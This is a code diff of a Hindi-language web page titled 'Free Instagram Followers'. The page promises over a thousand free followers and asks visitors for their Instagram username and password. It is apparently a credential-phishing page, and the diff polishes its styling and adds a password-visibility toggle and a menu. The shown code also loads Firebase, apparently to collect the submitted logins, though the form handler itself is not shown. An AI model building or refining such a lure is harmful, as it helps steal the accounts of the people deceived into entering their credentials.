@@ -1,196 +1,184 @@
 <html lang="en">
-
   <head>
-
-    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
-
+    <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
     <title>Free Instagram Followers</title>
-
     <style>
-
-      /* Global styles */
-
       body {
-
         margin: 0;
-
         padding: 0;
-
         font-family: "Poppins", Arial, sans-serif;
-
-        background: linear-gradient(to right, #8360c3, #2ebf91);
-
+        background: linear-gradient(135deg, #fc466b, #3f5efb);
         display: flex;
-
         justify-content: center;
-
         align-items: center;
-
         min-height: 100vh;
-
         color: #fff;
-
       }
-
       .container {
-
         width: 100%;
-
         max-width: 400px;
-
         padding: 20px;
-
-        background: rgba(255, 255, 255, 0.1);
-
-        backdrop-filter: blur(10px);
-
+        background: rgba(0, 0, 0, 0.5);
+        backdrop-filter: blur(15px);
         border-radius: 15px;
-
-        box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
-
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
         text-align: center;
-
+        z-index: 2;
       }
-
       .container h1 {
-
         font-size: 24px;
-
         margin-bottom: 10px;
-
       }
-
       .container p {
-
         font-size: 16px;
-
         margin-bottom: 20px;
-
         line-height: 1.5;
-
       }
-
       .input-field {
-
         width: 100%;
-
         padding: 12px;
-
         margin: 10px 0;
-
         border: none;
-
         border-radius: 8px;
-
         font-size: 14px;
-
         background: rgba(255, 255, 255, 0.2);
-
         color: #fff;
-
       }
-
       .input-field::placeholder {
-
         color: #ddd;
-
       }
-
-      .submit-button {
-
-        width: 100%;
-
-        padding: 12px;
-
+      .input-group {
+        position: relative;
+        margin: 10px 0;
+      }
+      .input-group .toggle-password {
+        position: absolute;
+        top: 50%;
+        right: 10px;
+        transform: translateY(-50%);
+        background: none;
         border: none;
-
-        border-radius: 8px;
-
-        font-size: 16px;
-
-        font-weight: bold;
-
         color: #fff;
-
-        background-color: #2ebf91;
-
         cursor: pointer;
-
+        font-size: 18px;
+      }
+      .submit-button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: bold;
+        color: #fff;
+        background-color: #3f5efb;
+        cursor: pointer;
         transition: all 0.3s ease;
-
       }
-
       .submit-button:hover {
-
-        background-color: #25a479;
-
+        background-color: #2b47c8;
       }
-
       footer {
-
         margin-top: 20px;
-
         font-size: 14px;
-
       }
-
+      .menu {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        z-index: 3;
+      }
+      .menu button {
+        background: transparent;
+        border: none;
+        color: #fff;
+        font-size: 24px;
+        cursor: pointer;
+        outline: none;
+      }
+      .menu-options {
+        display: none;
+        flex-direction: column;
+        position: absolute;
+        top: 40px;
+        left: 0;
+        background: rgba(0, 0, 0, 0.7);
+        border-radius: 8px;
+        padding: 10px;
+        width: 150px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      }
+      .menu-options a {
+        color: #fff;
+        text-decoration: none;
+        padding: 10px 15px;
+        border-radius: 5px;
+        margin-bottom: 5px;
+        display: block;
+      }
+      .menu-options a:hover {
+        background-color: rgba(255, 255, 255, 0.2);
+      }
     </style>
-
   </head>
-
   <body>
-
-    <div class="container">
-
-      <h1>फ्री इंस्टाग्राम फॉलोअर्स</h1>
-
-      <p>
-
-        अब आपको बिल्कुल फ्री में इंस्टाग्राम पर एक हज़ार से ज्यादा फॉलोअर्स दिए जा
-
-        रहे हैं। अगर आप भी इस प्रकार से अपने फॉलोअर्स बढ़ाना चाहते हैं तो नीचे
-
-        लॉगिन करें।
-
-      </p>
-
-      <form id="loginForm">
-
-        <input
-
-          class="input-field"
-
-          id="username"
-
-          type="text"
-
-          placeholder="Enter your Username"
-
-        />
-
-        <input
-
-          class="input-field"
-
-          id="password"
-
-          type="password"
-
-          placeholder="Enter your Password"
-
-        />
-
-        <button class="submit-button" type="submit">Login</button>
-
-      </form>
-
-      <footer>&copy; 2025 Free Followers | All Rights Reserved</footer>
-
+    <!-- Three-Line Menu -->
+    <div class="menu">
+      <button onclick="toggleMenu()">☰</button>
+      <div class="menu-options" id="menuOptions">
+        <a href="#">Settings</a>
+        <a href="#">Help</a>
+        <a href="#">About</a>
+      </div>
     </div>
 
-    <script type="module">
+    <div class="container">
+      <h1>फ्री इंस्टाग्राम फॉलोअर्स</h1>
+      <p>
+        अब आपको बिल्कुल फ्री में इंस्टाग्राम पर एक हज़ार से ज्यादा फॉलोअर्स दिए जा
+        रहे हैं। अगर आप भी इस प्रकार से अपने फॉलोअर्स बढ़ाना चाहते हैं तो नीचे
+        लॉगिन करें।
+      </p>
+      <form id="loginForm">
+        <input
+          class="input-field"
+          id="username"
+          type="text"
+          placeholder="Enter your Username"
+        />
+        <div class="input-group">
+          <input
+            class="input-field"
+            id="password"
+            type="password"
+            placeholder="Enter your Password"
+          />
+          <button
+            type="button"
+            class="toggle-password"
+            onclick="togglePassword()"
+          >
+            👁️
+          </button>
+        </div>
+        <button class="submit-button" type="submit">Login</button>
+      </form>
+      <footer>&copy; 2025 Free Followers | All Rights Reserved</footer>
+    </div>
+
+    <script>
+      function toggleMenu() {
+        const menu = document.getElementById("menuOptions");
+        menu.style.display = menu.style.display === "flex" ? "none" : "flex";
+      }
+
+      function togglePassword() {
+        const passwordField = document.getElementById("password");
+        passwordField.type =
+          passwordField.type === "password" ? "text" : "password";
+      }
+    </script>
+      <script type="module">
 
       import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
 
@@ -356,5 +344,4 @@
 </script>
 
   </body>
-
-</html>
+  </html>
